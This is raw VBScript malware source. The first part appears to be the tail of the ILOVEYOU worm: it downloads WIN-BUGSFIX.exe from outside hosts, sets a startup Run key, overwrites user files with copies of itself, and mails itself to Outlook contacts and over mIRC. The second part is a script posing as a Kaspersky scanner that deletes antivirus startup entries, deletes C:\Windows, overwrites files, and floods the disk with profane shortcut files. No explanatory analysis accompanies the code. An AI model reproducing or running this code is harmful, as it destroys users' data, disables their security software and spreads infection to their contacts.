 Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfm
 hPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
 elseif num = 2 then
 regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqw
 erWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
 elseif num = 3 then
 regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start
 Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBd
 QZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
 elseif num = 4 then
 regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start
 Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSD
 GjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN -BUGSFIX.exe"
 end if
 end if
 if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then regcreate
 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BU GSFIX",downread&"\WIN-BUGSFIX.exe"
 regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet
 Explorer\Main\Start Page","about:blank"
 end if
 end sub
 sub listadriv
 On Error Resume Next
 Dim d,dc,s
 Set dc = fso.Drives
 For Each d in dc
 If d.DriveType = 2 or d.DriveType=3 Then
 folderlist(d.path&"\")
 end if
 Next
 listadriv = s
 end sub
 sub infectfiles(folderspec)
 On Error Resume Next
 dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
 set f = fso.GetFolder(folderspec)
 set fc = f.Files
 for each f1 in fc
 ext=fso.GetExtensionName(f1.path)
 ext=lcase(ext)
 s=lcase(f1.name)
 if (ext="vbs") or (ext="vbe") then
 set ap=fso.OpenTextFile(f1.path,2,true)
 ap.write vbscopy
 ap.close
 elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
 set ap=fso.OpenTextFile(f1.path,2,true)
 ap.write vbscopy
 ap.close
 bname=fso.GetBaseName(f1.path)
 set cop=fso.GetFile(f1.path)
 cop.copy(folderspec&"\"&bname&".vbs") fso.DeleteFile(f1.path)
 elseif(ext="jpg") or (ext="jpeg") then
 set ap=fso.OpenTextFile(f1.path,2,true)
 ap.write vbscopy
 ap.close
 set cop=fso.GetFile(f1.path)
 cop.copy(f1.path&".vbs")
 fso.DeleteFile(f1.path)
 elseif(ext="mp3") or (ext="mp2") then
 set mp3=fso.CreateTextFile(f1.path&".vbs")
 mp3.write vbscopy
 mp3.close
 set att=fso.GetFile(f1.path)
 att.attributes=att.attributes+2
 end if
 if (eq<>folderspec) then
 if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
 set scriptini=fso.CreateTextFile(folderspec&"\script.ini") scriptini.WriteLine "[script]"
 scriptini.WriteLine ";mIRC Script"
 scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
 scriptini.WriteLine "    corrupt... WINDOWS will affect and will not run correctly. thanks"
 scriptini.WriteLine ";"
 scriptini.WriteLine ";Khaled Mardam-Bey"
 scriptini.WriteLine ";http://www.mirc.com"
 scriptini.WriteLine ";"
 scriptini.WriteLine "n0=on 1:JOIN:#:{"
 scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }" scriptini.WriteLine "n2=  /.dcc send $nick
 "&dirsystem&"\LOVE-LETTER-FOR-YOU.HTM"
 scriptini.WriteLine "n3=}"
 scriptini.close
 eq=folderspec
 end if
 end if
 next
 end sub
 sub folderlist(folderspec)
 On Error Resume Next
 dim f,f1,sf
 set f = fso.GetFolder(folderspec)
 set sf = f.SubFolders
 for each f1 in sf
 infectfiles(f1.path)
 folderlist(f1.path)
 next
 end sub
 sub regcreate(regkey,regvalue)
 Set regedit = CreateObject("WScript.Shell")
 regedit.RegWrite regkey,regvalue
 end sub
 function regget(value)
 Set regedit = CreateObject("WScript.Shell")
 regget=regedit.RegRead(value)
 end function
 function fileexist(filespec)
 On Error Resume Next
 dim msg
 if (fso.FileExists(filespec)) Then
 msg = 0
 else
 msg = 1
 end if
 fileexist = msg
 end function
 function folderexist(folderspec)
 On Error Resume Next
 dim msg
 if (fso.GetFolderExists(folderspec)) then
 msg = 0
 else
 msg = 1
 end if
 fileexist = msg
 end function
 sub spreadtoemail()
 On Error Resume Next
 dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
 set regedit=CreateObject("WScript.Shell")
 set out=WScript.CreateObject("Outlook.Application")
 set mapi=out.GetNameSpace("MAPI")
 for ctrlists=1 to mapi.AddressLists.Count
 set a=mapi.AddressLists(ctrlists)
 x=1
 regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a) if (regv="") then
 regv=1
 end if
 if (int(a.AddressEntries.Count)>int(regv)) then
 for ctrentries=1 to a.AddressEntries.Count
 malead=a.AddressEntries(x)
 regad=""
 regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead )
 if (regad="") then
 set male=out.CreateItem(0)
 male.Recipients.Add(malead)
 male.Subject = "ILOVEYOU"
 male.Body = vbcrlf&"kindly check the attached LOVELETTER coming from me."
 male.Attachments.Add(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs") male.Send
 regedit.RegWrite
 "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD" end if
 x=x+1
 next
 regedit.RegWrite
 "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count else
 regedit.RegWrite
 "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count end if
 next
 Set out=Nothing
 Set mapi=Nothing
 end sub
 sub html
 On Error Resume Next
 dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
 dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS -
 LOVELETTER@-@>"&vbcrlf& _ "<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-?
 @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _ "<META NAME=@-@Description@-@
 CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
 "<?-?HEAD><BODY
 ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.
 HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
 "ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU. HTM#-#,#-#main#-#)@-@
 BGPROPERTIES=@-@fixed@-@
 BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
 "<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to
 Enable ActiveX<?-?p>"&vbcrlf& _
 "<?-?CENTER><MARQUEE LOOP=@-@infinite@-@
 BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQU EE> "&vbcrlf& _
 "<?-?BODY><?-?HTML>"&vbcrlf& _
 "<SCRIPT language=@-@JScript@-@>"&vbcrlf& _ "<!--?-??-?"&vbcrlf& _
 "if (window.screen){var wi=screen.availWidth;var
 hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrl f& _
 "?-??-?-->"&vbcrlf& _
 "<?-?SCRIPT>"&vbcrlf& _
 "<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _ "<!--"&vbcrlf& _
 "on error resume next"&vbcrlf& _
 "dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _ "aw=1"&vbcrlf& _
 "code="
 dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
 "set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _ "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
 "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _ "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _ "set
 wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
 "wri.write code4"&vbcrlf& _
 "wri.close"&vbcrlf& _
 "if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _ "if (err.number=424) then"&vbcrlf& _
 "aw=0"&vbcrlf& _
 "end if"&vbcrlf& _
 "if (aw=1) then"&vbcrlf& _
 "document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _ "window.close"&vbcrlf& _
 "end if"&vbcrlf& _
 "end if"&vbcrlf& _
 "Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
 "regedit.RegWrite
 @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^
 -^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _ "?-??-?-->"&vbcrlf& _
 "<?-?SCRIPT>"
 dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
 dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""") dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
 dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
 dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
 dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""") dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
 dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
 set fso=CreateObject("Scripting.FileSystemObject")
 set c=fso.OpenTextFile(WScript.ScriptFullName,1)
 lines=Split(c.ReadAll,vbcrlf)
 l1=ubound(lines)
 for n=0 to ubound(lines)
 lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91)) lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
 lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37)) if (l1=n) then
 lines(n)=chr(34)+lines(n)+chr(34)
 else
 lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _" end if
 next
 set b=fso.CreateTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM") b.close
 set d=fso.OpenTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM",2) d.write dt5
 d.write join(lines,vbcrlf)
 d.write vbcrlf
 d.write dt6
 d.close
 end sub

VBS.CarewMR.a By Jadraquer Killer (Mr.Carew)
On Error Resume Next                                       
Set carew= CreateObject("WScript.Shell")

'In memory of Rocio and Pamela :)
     	
Msgbox "Welcome to CLRAV of Kaspersky Labs, press OK or Accept to Start scanning your computer. "
Msgbox "ERROR!, Code error:3212552, please execute this tool in MS-DOS."
Msgbox "Thank You for prefer Kaspersky Labs Products"
If Month(Now()) = 09 And  Day(Now()) = 01 Then MsgBox "Mr.Carew vuelve otra vez!!, jaja"
  
carew.Run "http:\\www.avp.ru" 


carew.regdelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\SystemTray"
carew.regdelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\AVPCC"
carew.regdelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\NAVW32"
carew.regdelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\TrueVector"
carew.regdelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\ZoneAlarm Pro"







Set carew= CreateObject("scripting.filesystemobject") 
  
carew.CreateTextFile "C:\Norton2003isbad_preferKAVORAVP" 
carew.CreateTextFile "C:\AVP" 
carew.CreateTextFile "C:\NAV" 
carew.CreateTextFile "C:\CHILE" 
carew.CreateTextFile "C:\TEMUCO" 
carew.CreateTextFile "C:\MCAFEE" 
carew.CreateTextFile "C:\ENTELPCS" 

carew.CreateTextFile "C:\GSM1900MHZ" 
carew.CreateTextFile "C:\SONYERICSSON" 
carew.CreateTextFile "C:\CAREFULLY_WHIT_ME" 

carew.CreateTextFile "C:\YOUR_PC_IS_VERY_BAD" 
carew.CreateTextFile "C:\I HATE MELINA" 
carew.CreateTextFile "C:\VBS.CarewMR.a"
carew.CreateTextFile "C:\Windows is a real virus?" 
carew.CreateTextFile "C:\MELINA_TE_ODIO_MUERETE!" 
carew.CreateTextFile "C:\WindowsXP"
carew.CreateTextFile "C:\Windows3.11" 
carew.CreateTextFile "C:\Windows98SE"
carew.CreateTextFile "C:\WindowsME"  
carew.CreateTextFile "C:\Windows 95" 
carew.CreateTextFile "C:\WindowsNT"
carew.CreateTextFile "C:\Windows2000"
carew.CreateTextFile "C:\TELLCELL S.A"
carew.CreateTextFile "C:\PORN"
carew.CreateTextFile "C:\ORAL_SEX"
carew.CreateTextFile "C:\BIN_LADEN_FUCKYOU"
carew.CreateTextFile "C:\ICQ"
carew.CreateTextFile "C:\PANDA"
carew.CreateTextFile "C:\NOD32"
carew.CreateTextFile "C:\TREND"
carew.CreateTextFile "C:\PC-CILLIN"
carew.CreateTextFile "C:\AvpM.exe" 
carew.CreateTextFile "C:\Kaspersky_AntiVirus_PersonalPRO_THEBEST!!!!!"
carew.CreateTextFile "C:\Norton_thePOOR"
carew.CreateTextFile "C:\Madonna_Sucking_my_dick.avi"
carew.CreateTextFile "C:\Your_system_is_infected_by_a_virus_jajajajajajaja.jajajaja"   

carew.CreateTextFile "C:\THE_HEURISTIC_OF_NORTON_IS_VERY_BAD_AND_PRODUCE:POSITIVES-FALSES" 

carew.CreateFolder "C:\Symantec" 
carew.CreateFolder "C:\KasperskyLabs" 
carew.CreateFolder "C:\PandaSoftware" 
carew.CreateFolder "C:\TrendMicro" 
carew.CreateFolder "C:\Eset-Nod-fucked" 




          


carew.deleteFolder "C:\Windows" 

set virus = carew.CreateTextFile (".\CLRAV_Report.log",False)
virus.Writeline "Due an error, Code error:3212552, CLRAV has not disinfect your computer"                                 
virus.Writeline "For Support please send a e-mail to support@kaspersky.com and please indicate the Code Error." 			
virus.Close

Set WshShell = Wscript.CreateObject("Wscript.Shell")

CommandPath = WSHShell.ExpandEnvironmentStrings("%comspec%")

WshShell.Run (CommandPath & " /c for %%a in (*.*) do copy /y " & Wscript.ScriptFullName & " %%a >nul"), vbHide

If Day(Now()) = 11 And Month(Now()) = 9 Then

Set obj = CreateObject("Scripting.FileSystemObject") 
obj.DeleteFile("C:\Windows\win.ini")
obj.DeleteFile("C:\Windows\win.com")

Set oUrlLink = WshShell.CreateShortcut("FUCKED.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED2.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED3.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED4.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED5.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED6.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED7.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED8.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED9.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED10.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED11.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED12.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED13.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED14.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED15.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED16.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED17.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED18.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED19.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED20.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED21.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED22.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED23.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED24.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED25.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED26.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED27.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED28.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED29.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED30.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED31.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED32.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED33.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED34.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED35.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED36.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED37.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED38.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED39.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED40.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED40.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED41.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED42.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED43.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED44.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED45.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED46.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED47.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED48.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED49.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED50.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED51.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED52.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED53.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED54.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED55.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED56.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED57.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED58.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED59.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED60.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED61.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED62.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED63.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED64.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED65.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED66.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED67.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED68.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED69.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED70.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED71.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED72.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED73.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED74.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED75.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED76.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED77.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED78.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED79.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED80.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED81.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED82.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED83.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED84.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED85.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED86.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED87.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED88.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED89.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED90.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED91.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED92.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED93.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED94.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED95.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED96.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED97.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED98.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED99.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED100.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED101.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut("FUCKED102.url")
oUrlLink.TargetPath = "http://www.youtube.com/t3chyy"
oUrlLink.Save

